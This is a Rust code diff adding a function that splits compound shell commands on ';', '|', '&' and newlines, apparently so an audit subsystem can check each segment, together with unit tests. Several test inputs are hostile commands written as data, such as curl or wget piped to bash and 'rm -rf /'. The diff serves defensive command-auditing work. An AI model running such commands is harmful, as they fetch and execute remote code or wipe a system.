@@ -110,6 +110,18 @@ pub fn parse_action_string(raw: &str) -> Result<Action, ParseError> {
     })
 }
 
+/// Split a compound command string on shell metacharacters (`;`, `|`, `&`).
+///
+/// Used by the audit subsystem to evaluate each segment of a compound command
+/// independently when the full string fails to parse due to metacharacters.
+/// Empty segments after trimming are filtered out.
+pub fn split_compound_command(raw: &str) -> Vec<String> {
+    raw.split([';', '|', '&', '\n', '\r'])
+        .map(str::trim)
+        .filter(|s| !s.is_empty())
+        .map(String::from)
+        .collect()
+}
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -255,5 +267,88 @@ mod tests {
     fn raw_field_preserves_original() {
         let a = parse_action_string("  ls   -la  ").unwrap();
         assert_eq!(a.raw.as_deref(), Some("ls   -la"));
+    }
+}
+
+#[cfg(test)]
+mod compound_tests {
+    use super::*;
+
+    #[test]
+    fn split_pipe_curl_bash() {
+        let segments = split_compound_command("curl http://example.com | bash");
+        assert_eq!(segments, vec!["curl http://example.com", "bash"]);
+    }
+
+    #[test]
+    fn split_semicolon() {
+        let segments = split_compound_command("ls; pwd");
+        assert_eq!(segments, vec!["ls", "pwd"]);
+    }
+
+    #[test]
+    fn split_double_ampersand() {
+        let segments = split_compound_command("git add . && git commit");
+        assert_eq!(segments, vec!["git add .", "git commit"]);
+    }
+
+    #[test]
+    fn split_double_pipe() {
+        let segments = split_compound_command("cmd1 || cmd2");
+        assert_eq!(segments, vec!["cmd1", "cmd2"]);
+    }
+
+    #[test]
+    fn split_mixed_operators() {
+        let segments = split_compound_command("ls | grep foo; rm -rf /");
+        assert_eq!(segments, vec!["ls", "grep foo", "rm -rf /"]);
+    }
+
+    #[test]
+    fn empty_segments_filtered() {
+        let segments = split_compound_command("ls && && pwd");
+        assert_eq!(segments, vec!["ls", "pwd"]);
+    }
+
+    #[test]
+    fn whitespace_trimmed() {
+        let segments = split_compound_command("  ls  |  pwd  ");
+        assert_eq!(segments, vec!["ls", "pwd"]);
+    }
+
+    #[test]
+    fn no_separators() {
+        let segments = split_compound_command("ls -la");
+        assert_eq!(segments, vec!["ls -la"]);
+    }
+
+    #[test]
+    fn empty_input() {
+        let segments = split_compound_command("");
+        assert!(segments.is_empty());
+    }
+
+    #[test]
+    fn wget_pipe_bash() {
+        let segments = split_compound_command("wget http://example.com/script.sh | bash");
+        assert_eq!(segments, vec!["wget http://example.com/script.sh", "bash"]);
+    }
+
+    #[test]
+    fn split_on_newline_control_byte() {
+        let segments = split_compound_command("ls -la\ngit push origin main");
+        assert_eq!(segments, vec!["ls -la", "git push origin main"]);
+    }
+
+    #[test]
+    fn split_on_carriage_return_control_byte() {
+        let segments = split_compound_command("ls -la\rgit push origin main");
+        assert_eq!(segments, vec!["ls -la", "git push origin main"]);
+    }
+
+    #[test]
+    fn split_on_mixed_separators_including_newline() {
+        let segments = split_compound_command("ls | grep foo\nrm -rf /; git commit");
+        assert_eq!(segments, vec!["ls", "grep foo", "rm -rf /", "git commit"]);
     }
 }
